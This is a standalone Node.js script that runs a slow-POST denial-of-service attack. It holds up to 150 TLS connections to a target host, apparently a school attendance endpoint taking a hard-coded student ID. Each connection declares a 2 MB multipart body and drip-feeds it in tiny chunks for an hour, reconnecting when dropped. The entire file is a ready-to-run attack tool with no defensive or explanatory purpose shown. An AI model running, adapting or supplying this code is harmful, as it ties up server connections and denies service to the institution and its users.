// job_b — long-lived connection holder
import tls from "node:tls";
import { appendFileSync } from "fs";

const HOST = process.env.HOSTNAME_ONLY;
const SID = process.env.SID;
if (!HOST || !SID) process.exit(0);

const N = parseInt(process.env.N || "150");
const CHUNK = parseInt(process.env.CHUNK || "256");
const TICK = parseInt(process.env.TICK || "3000");
const BODY = parseInt(process.env.BODY || "2097152");
const DURATION = parseInt(process.env.DURATION || "3600") * 1000;
const LOG = "job_b.log";
const log = (s) => { try { appendFileSync(LOG, `[${new Date().toISOString()}] ${s}\n`); } catch {} };

const head = `POST /api/sessions/${SID}/attend HTTP/1.1\r\nHost: ${HOST}\r\nContent-Type: multipart/form-data; boundary=----x\r\nContent-Length: ${BODY}\r\nConnection: keep-alive\r\n\r\n`;
const bodyStart = `------x\r\nContent-Disposition: form-data; name="student_id"\r\n\r\n23345678\r\n`;
const restLen = BODY - Buffer.byteLength(bodyStart) - 2;

const sockets = [];
let running = true;

function openSocket(i) {
  const s = tls.connect({ host: HOST, port: 443, servername: HOST, rejectUnauthorized: false }, () => {
    s.write(head + bodyStart);
  });
  s.setNoDelay(true);
  s.on("error", () => respawn(i));
  s.on("close", () => {});
  s.hordeId = i;
  s.sent = 0;
  sockets[i] = s;
}
function respawn(i) {
  if (!running) return;
  setTimeout(() => { if (running) openSocket(i); }, 1000 + Math.random() * 3000);
}

for (let i = 0; i < N; i++) setTimeout(() => running && openSocket(i), i * 60);

const iv = setInterval(() => {
  if (!running) return;
  const chunk = Buffer.alloc(CHUNK, 0x41);
  for (const s of sockets) {
    if (s && !s.destroyed && s.sent < restLen) {
      try { s.write(chunk); s.sent += CHUNK; } catch {}
    } else if (s && s.sent >= restLen) {
      try { s.write(`------x--\r\n`); } catch {}
      respawn(s.hordeId);
    }
  }
}, TICK);

setTimeout(() => {
  running = false;
  clearInterval(iv);
  sockets.forEach(s => { try { s.destroy(); } catch {} });
  process.exit(0);
}, DURATION);
